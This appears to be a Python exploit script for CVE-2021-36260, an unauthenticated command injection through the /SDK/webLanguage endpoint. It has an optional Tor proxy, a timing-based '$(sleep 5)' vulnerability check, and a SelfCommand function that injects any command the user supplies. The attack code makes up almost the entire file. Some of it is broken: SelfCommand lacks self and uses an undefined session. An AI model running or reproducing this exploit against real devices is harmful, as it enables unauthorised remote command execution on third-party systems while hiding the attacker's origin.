#!/usr/bin/env python3
"""
CVE-2021-36260 Vulnerable Check

@TakenoSite
"""

import requests
import time 
import socket,socks 

class CVE2021_36260:
    
    def __init__(self, tor=False):
        if tor:
            print("[*] TorNet")
            try:
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
                socket.socket = socks.socksocket
            except:
                print("[!] Maybe Tor isn't running") 
                quit()
                pass 
        else:
            print("[*] ClearNet")
            pass

    def check(self, rhosts:str, rports:int) -> bool:

        session = requests.Session()
        conect_start_time = time.time()

        payload =  "<xml><language> None </language></xml>"
        
        url = "http://{}:{}{}".format(rhosts,rports,"/SDK/webLanguage")
        try:
            send = session.put(url,data=payload,verify=False,allow_redirects=False,timeout=22)
            print("[*] hsot : {}".format(rhosts))
            print("[*] status_code : {}".format(send.status_code)) 
            conect_end_time = time.time() - conect_start_time
            print("[*] Default in Conection Time : {}".format(conect_end_time))
            
            conect_start_time2 = time.time()
            payload2 =  "<xml><language>$(sleep 5)</language></xml>"
            
            url = "http://{}:{}{}".format(rhosts,rports,"/SDK/webLanguage")
            send = session.put(url,data=payload2,verify=False,allow_redirects=False)
            print("[*] status_code : {}".format(send.status_code)) 
            conect_end_time2 = time.time() - conect_start_time
            print("[*] Sleep 5 Send Time : {}".format(conect_end_time2))

            command_injection_count = conect_end_time - conect_end_time2
            if -2 > command_injection_count:
                print("[*]ã€€Vulnerable")
                return True

            else:
                print("[!] not in Vulnerable ")
                return False
        except:
            print("[!] Not in Conection")
            return False 

    def SelfCommand(rhosts:int, rports:int, command:str) -> bool:
        
        payload = "<xml><language> $("+command+") </language></xml>"
        url = "http://{}:{}{}".format(rhosts,rports,"/SDK/webLanguage")
        
        try:
            exploit = session.put(url,data=payload,verify=False,allow_redirects=False,timeout=22)
            print("[*] Completed")
            return True
        
        except:
            print("[!] not in conection")
            return False
        pass 

if __name__ == "__main__":
    
    run = CVE2021_36260()
    run.check(rhosts={target_host}, rports={target_port})
     
    
